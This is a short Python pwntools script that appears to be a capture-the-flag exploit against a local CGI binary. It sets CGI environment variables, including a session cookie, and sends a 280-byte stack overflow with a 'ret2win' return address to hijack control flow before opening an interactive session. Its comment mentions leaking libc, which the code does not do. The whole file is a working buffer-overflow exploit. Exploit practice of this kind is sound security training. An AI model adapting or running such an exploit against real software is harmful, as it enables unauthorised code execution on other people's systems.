from pwn import *


# initialize the binary
binary = "../web/www/api"
elf = context.binary = ELF(binary, checksec=False)

gs = """
break main
continue
"""

# envvars
env = {
    "PATH_INFO": "/create",
    "REQUEST_METHOD": "POST",
    "HTTP_COOKIE": "session=ed3f2d85696656f4ea64a0f1d5ceb399",
    "CONTENT_LENGTH": "512",
}

if args.GDB:
    p = gdb.debug(binary, gdbscript=gs, env=env)
else:
    p = elf.process(env=env)


# payload to leak libc
payload = b'A'*280
payload += p64(0x40165b)                # ret2win

p.sendline(payload)

p.interactive()